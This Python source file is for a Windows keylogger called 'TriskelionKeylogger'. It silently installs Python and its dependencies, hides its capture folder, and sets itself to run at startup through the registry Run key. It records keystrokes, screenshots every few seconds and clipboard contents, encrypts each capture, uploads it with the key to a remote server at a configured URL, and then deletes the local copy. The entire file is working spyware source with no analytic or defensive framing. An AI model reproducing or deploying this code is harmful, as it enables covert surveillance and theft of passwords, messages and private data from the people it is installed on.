import subprocess
import sys
import winreg as reg
import os
import json
import requests
import pyautogui
import pyperclip as clipboard
import time
import uuid
import keyboard
from threading import Thread, Event, Timer
from datetime import datetime, timedelta
from cryptography.fernet import Fernet

python_installer_url = "https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe"
installer_path = os.path.join(os.getenv('TEMP'), "python-installer.exe")

def check_python_installed():
    """Check if Python is installed."""
    try:
        result = subprocess.run(['python', '--version'], capture_output=True, text=True)
        if result.returncode == 0:
            print("Python is already installed.")
            return True
    except FileNotFoundError:
        pass
    return False

def download_python_installer():
    """Download the Python installer."""
    try:
        response = requests.get(python_installer_url, stream=True)
        with open(installer_path, 'wb') as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)
        print("Python installer downloaded.")
    except Exception as e:
        print(f"Failed to download Python installer: {e}")
        sys.exit(1)

def install_python():
    """Run the Python installer."""
    try:
        # Run the installer silently
        subprocess.run([installer_path, '/quiet', 'InstallAllUsers=1', 'PrependPath=1'], check=True)
        print("Python installation completed.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to install Python: {e}")
        sys.exit(1)

required_modules = [
    'keyboard', 'requests', 'pyautogui', 'pyperclip', 'threading', 
    'datetime', 'time', 'os', 'cryptography'
]

def install_module(module_name):
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', module_name])

def check_and_install_modules(modules):
    for module in modules:
        try:
            __import__(module)
        except ImportError:
            print(f"Module '{module}' is not installed. Installing...")
            install_module(module)
            print(f"Module '{module}' installed successfully.")

check_and_install_modules(required_modules)

config_file_path = 'config.json'
if not os.path.exists(config_file_path):
    config = {
        "serverURL": "http://192.168.1.6:5000/upload",
        "capturedDataDir": "C:\\CapturedData",
        "screenshotInterval": 5,
        "keystrokeInterval": 60,
        "clipboardInterval": 10
    }
    with open(config_file_path, 'w') as config_file:
        json.dump(config, config_file)
else:
    with open(config_file_path, 'r') as config_file:
        config = json.load(config_file)

SERVER_URL = config['serverURL']
CAPTURED_DATA_DIR = config['capturedDataDir']
SCREENSHOT_INTERVAL = config['screenshotInterval']
KEYSTROKE_INTERVAL = config['keystrokeInterval']
CLIPBOARD_INTERVAL = config['clipboardInterval']

# Generate and save encryption key
def generate_key():
    return Fernet.generate_key()

def save_key(key):
    with open('encryption_key.key', 'wb') as key_file:
        key_file.write(key)

# Load the encryption key
def load_key():
    with open('encryption_key.key', 'rb') as key_file:
        return key_file.read()

key = generate_key()
save_key(key)

def encrypt_file(file_path, key):
    cipher = Fernet(key)
    with open(file_path, 'rb') as file:
        original = file.read()
    encrypted = cipher.encrypt(original)
    with open(file_path, 'wb') as file:
        file.write(encrypted)

def ensure_hidden_directory(path):
    """Ensure the directory exists and is set as hidden."""
    if not os.path.exists(path):
        os.makedirs(path)
    # Set the directory attribute to hidden
    subprocess.call(["attrib", "+H", path])

ensure_hidden_directory(CAPTURED_DATA_DIR)

class TriskelionKeylogger:
    def __init__(self):
        self.startDateTime = datetime.now()
        self.endDateTime = datetime.now()
        self.capturedDataDir = CAPTURED_DATA_DIR
        self.stop_event = Event()

    def sendData(self, filePath, key):
        with open(filePath, 'rb') as f:
            files = {'file': f}
            try:
                response = requests.post(SERVER_URL, files=files, data={'key': key}, timeout=30)
                print(response.status_code, response.reason)
            except Exception as e:
                print(f"File failed to upload: {e}")

    def updateFileName(self, filePrefix, fileExtension):
        startDateTimeStr = str(self.startDateTime)[:-7].replace(" ", "-").replace(":", "")
        endDateTimeStr = str(self.endDateTime)[:-7].replace(" ", "-").replace(":", "")
        unique_id = uuid.uuid4().hex
        return f"{filePrefix}-{startDateTimeStr}_{endDateTimeStr}{unique_id}{fileExtension}"

    def screenshotCapture(self):
        def capture_screenshot():
            while not self.stop_event.is_set():
                time.sleep(SCREENSHOT_INTERVAL)
                imgName = self.updateFileName("Screenshot", ".png")
                img = pyautogui.screenshot()
                filePath = os.path.join(self.capturedDataDir, imgName)
                img.save(filePath)
                print(f"Screenshot captured to {filePath}")
                encrypt_file(filePath, key)
                self.sendData(filePath, key)
                Timer(1, lambda: os.remove(filePath)).start()

        screenshotCaptureThread = Thread(target=capture_screenshot)
        screenshotCaptureThread.start()

    def keystrokeCapture(self):
        def capture_keystrokes():
            keystrokeLog = ""
            self.startDateTime = datetime.now()
            self.endDateTime = self.startDateTime + timedelta(seconds=KEYSTROKE_INTERVAL)

            def callback(event):
                nonlocal keystrokeLog
                name = event.name
                
                if len(name) > 1:
                    if name == "space":
                        name = " "
                    elif name == "enter":
                        name = "[ENTER]\n"
                    elif name == "decimal":
                        name = "."
                    else:
                        name = name.replace(" ", "_")
                        name = f"[{name.upper()}]"

                keystrokeLog += name

            keyboard.on_release(callback)

            print(f"Keystroke capture started at {self.startDateTime}")

            while datetime.now() < self.endDateTime and not self.stop_event.is_set():
                time.sleep(1)

            keyboard.unhook_all()

            keystrokeFileName = self.updateFileName("Keystrokes", ".txt")
            filePath = os.path.join(self.capturedDataDir, keystrokeFileName)
            with open(filePath, 'w') as file:
                file.write(keystrokeLog)
            print(f"Keystroke log saved to {filePath}")
            encrypt_file(filePath, key)
            self.sendData(filePath, key)
            Timer(1, lambda: os.remove(filePath)).start()

        keystrokeCaptureThread = Thread(target=capture_keystrokes)
        keystrokeCaptureThread.start()

    def clipboardCapture(self):
        def capture_clipboard():
            last_content = ""
            while not self.stop_event.is_set():
                time.sleep(CLIPBOARD_INTERVAL)
                current_content = clipboard.paste()

                # Skip if clipboard is empty
                if not current_content:
                    continue
                
                # Skip if content hasn't changed
                if current_content == last_content:
                    continue

                last_content = current_content
                clipboardFileName = self.updateFileName("ClipboardCapture", ".txt")
                filePath = os.path.join(self.capturedDataDir, clipboardFileName)
                with open(filePath, 'w') as file:
                    file.write(current_content)
                print(f"Clipboard data captured to {filePath}")
                encrypt_file(filePath, key)
                self.sendData(filePath, key)
                Timer(1, lambda: os.remove(filePath)).start()

        clipboardCaptureThread = Thread(target=capture_clipboard)
        clipboardCaptureThread.start()

    def stop(self):
        self.stop_event.set()

def add_to_startup(file_path=None):
    if file_path is None:
        file_path = os.path.realpath(sys.argv[0])
    
    # Define the key and value
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    value = "TriskelionKeylogger"
    
    # Open the key to set the value
    key_open = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_ALL_ACCESS)
    reg.SetValueEx(key_open, value, 0, reg.REG_SZ, file_path)
    reg.CloseKey(key_open)
    print(f"Added {file_path} to startup registry.")

if __name__ == "__main__":
    if not check_python_installed():
        print("Python is not installed. Installing...")
        download_python_installer()
        install_python()
        print("Python installation completed.")
        time.sleep(30)

    add_to_startup()

    keylogger = TriskelionKeylogger()
    keylogger.screenshotCapture()
    keylogger.keystrokeCapture()
    keylogger.clipboardCapture()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Triskelion has been stopped.")
        keylogger.stop()
